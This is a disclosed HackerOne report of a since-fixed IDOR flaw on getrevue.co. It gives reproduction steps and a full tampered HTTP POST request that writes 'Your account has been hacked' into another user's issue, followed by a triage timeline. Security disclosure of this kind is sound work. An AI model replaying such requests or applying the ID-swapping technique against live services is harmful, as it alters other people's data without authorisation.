---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/insecure-direct-object-reference-idor
  - env/web
  - vuln/csrf
  - vuln/idor
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2021-05-26
submitted: 2021-02-05T17:50:44.767Z
bounty_usd: null
votes: 67
cve: []
program: "[[programs/x|X / xAI]]"
reporter: "mirhat"
source: "https://hackerone.com/reports/1096560"
title: "Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co"
---
# Ability to add arbitrary images/descriptions/titles to ohter people's issues via IDOR on getrevue.co

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 67 | **Program:** X / xAI | **Disclosed:** 2021-05-26

- Report: [https://hackerone.com/reports/1096560](https://hackerone.com/reports/1096560)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2021-02-05T17:50:44.767Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 

Hi team,
I discovered a vulnerability that allows an attacker to add arbitrary images/descriptions/titles to other people's issues via IDOR

**Description:**

It's possible to perform a IDOR attacker on `getrevue.co`when adding a image to your issue it's also possible to add descriptions and more to other people's issue

## Steps To Reproduce:

   1. Go to `getrevue.co` and Sign In
   2. Click on Issues then Click on Add new issue
   3. Go to the Issue that you created and from the bottom of the page Click on Media
   4. Turn on the Intercept and Upload image
   5. On the request change the ID to your other account's issue ID

Request:

```
POST /app/items HTTP/1.1
Host: www.getrevue.co
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://www.getrevue.co/app/issues/current
X-CSRF-Token: qbWPNjfb12c1Plj7WrYDYgQFgWl2IaZr6/Qr/Vf5WyaDGyf68jn1mzx3xwtgFxBBX19RkHs/YHiREA7Ae6PGqg==
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 519
Origin: https://www.getrevue.co
Connection: close
Cookie: [YOUR_COOKIE]

{"item_type":"image","issue":347976,"id":null,"title":"Your account has been hacked","url":"","description":"Your account has been hacked","author":"Your account has been hacked","publication":"Your account has been hacked","section":"Your account has been hacked","image":"https://revue-direct-production.s3.amazonaws.com/cache/30fd80f79ad919f1e310aa97e0ab7940/7dc308f18b70ba627eb954d2d5376bea.png","image_file_name":"","created_at":"","tweet_handle":"","tweet_profile_image":"","tweet_description":"","tweet_lang":""}
```

POC video:

{F1185366}

## Impact

Ability to add arbitrary images/descriptions/titles to other people's issues
It's possible to hijack other people's issues

## Timeline

- **Report Filed**
- **2021-02-05** @bugtriage-sophia: Thank you for your report @mirhat,

We were able to reproduce the behavior you described, and we will get back to you when we have more information.

Thank you for thinking of Twitter security
- **Report Triaged**
- **2021-03-26** @mirhat: Hi @mchuri,

This issue seems to be fixed,
Are there any updates regarding this report and the bounty decision?

Best,
@mirhat
- **Not Eligible For Bounty**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
